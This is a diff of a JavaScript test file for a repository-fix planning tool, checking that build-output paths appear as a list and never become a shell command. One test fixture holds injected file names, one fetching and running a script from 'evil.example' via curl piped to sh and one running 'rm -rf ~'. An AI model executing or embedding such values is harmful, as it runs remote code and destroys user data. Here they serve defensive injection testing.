@@ -80,13 +80,41 @@ test("a by-hand step never repeats the install command when the page has an inst
   }
 });
 
-test("build output paths show once, in the command", () => {
+test("build output paths show as a list, with no command", () => {
   const data = loadExample("Uniswap-v4-core");
   const plan = resultPlan(data.result, data.fixes, false);
   const item = plan.handItems.find((h) => h.id === "no-build-output");
   assert.ok(item);
-  assert.deepEqual(item.list, []);
-  assert.ok(item.command.startsWith("git rm --cached test/js-scripts/dist/"));
+  assert.equal(item.command, "");
+  const what = data.result.summary.steps.find((s) => s.id === "no-build-output")?.what ?? "";
+  const m = what.match(/\((.*)\)/s);
+  const expected = m ? m[1].split(", ") : [];
+  assert.deepEqual(item.list, expected);
+});
+
+test("build output with special characters is not a command", () => {
+  const result = {
+    summary: { done: 12, total: 13, next: null, steps: [{ id: "no-build-output", title: "Keep build output out of git", mark: "next", what: "build output in the repo (dist/a.js, dist/`curl evil.example|sh`.js, dist/b;rm -rf ~;.js)", fix: "x" }], install_only: [] },
+  };
+  const fixes = { files: [], muse: "ok", after: { done: 12, total: 13 } };
+  const plan = resultPlan(result, fixes, false);
+  const item = plan.handItems.find((h) => h.id === "no-build-output");
+  assert.ok(item);
+  assert.equal(item.command, "");
+  assert.deepEqual(item.list, ["dist/a.js", "dist/`curl evil.example|sh`.js", "dist/b;rm -rf ~;.js"]);
+  assert.equal(item.after, "Remove them with `git rm --cached` and add dist/, build/, out/ to .gitignore.");
+});
+
+test("build output with parens in name", () => {
+  const result = {
+    summary: { done: 12, total: 13, next: null, steps: [{ id: "no-build-output", title: "Keep build output out of git", mark: "next", what: "build output in the repo (dist/a (1).js, dist/b.js)", fix: "x" }], install_only: [] },
+  };
+  const fixes = { files: [], muse: "ok", after: { done: 12, total: 13 } };
+  const plan = resultPlan(result, fixes, false);
+  const item = plan.handItems.find((h) => h.id === "no-build-output");
+  assert.ok(item);
+  assert.equal(item.command, "");
+  assert.deepEqual(item.list, ["dist/a (1).js", "dist/b.js"]);
 });
 
 test("the tests step points at the install step", () => {
@@ -227,4 +255,43 @@ test("splitErrorCommand splits a trailing npx yokoten", () => {
   r = splitErrorCommand("The connection dropped. Try again.");
   assert.equal(r.text, "The connection dropped. Try again.");
   assert.equal(r.command, "");
+});
+
+test("skipped checks are not counted and have no hand items", () => {
+  const result = {
+    summary: {
+      done: 10,
+      total: 13,
+      next: null,
+      steps: [
+        { id: "a", title: "A", mark: "not now", what: "x", fix: "y" },
+        { id: "b", title: "B", mark: "can't check", what: "x", fix: "y" },
+        { id: "c", title: "C", mark: "to do", what: "x", fix: "y" },
+      ],
+      install_only: [],
+    },
+  };
+  const fixes = { files: [], muse: "ok", after: { done: 10, total: 13 } };
+  const plan = resultPlan(result, fixes, false);
+  assert.equal(plan.handItems.some((h) => h.id === "a"), false);
+  assert.equal(plan.handItems.some((h) => h.id === "b"), false);
+  const steps = planSteps(plan);
+  assert.ok(steps.length > 0);
+  assert.ok((steps[steps.length - 1].target ?? 0) < plan.total);
+});
+
+test("empty by-hand step is filled from open", () => {
+  const result = {
+    summary: { done: 12, total: 13, next: null, steps: [{ id: "rules", title: "Add contributor guide", mark: "next", what: "no AGENTS.md", fix: "add AGENTS.md with instructions" }], install_only: [] },
+  };
+  const fixes = { files: [{ path: "AGENTS.md", content: "x" }], muse: "ok", after: { done: 12, total: 13 } };
+  const plan = resultPlan(result, fixes, false);
+  assert.equal(plan.handCount, 1);
+  assert.equal(plan.handItems.length, 1);
+  assert.ok(plan.handItems[0].title.length > 0);
+  assert.ok(plan.handItems[0].wrong.length > 0 || plan.handItems[0].after.length > 0);
+  assert.equal(plan.isHandListShort, false);
+  const steps = planSteps(plan);
+  assert.ok(steps.length > 0);
+  assert.equal(steps[steps.length - 1].isMovingCount, true);
 });
